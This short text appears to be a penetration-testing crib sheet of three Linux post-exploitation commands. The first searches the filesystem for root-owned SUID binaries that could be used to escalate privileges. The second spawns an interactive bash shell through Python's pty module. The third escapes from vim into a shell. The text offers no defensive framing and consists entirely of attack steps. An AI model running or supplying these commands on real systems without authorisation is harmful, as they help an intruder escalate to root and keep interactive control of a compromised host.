find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
python -c 'import pty; pty.spawn("/bin/bash")'
vim -c ':!/bin/sh'
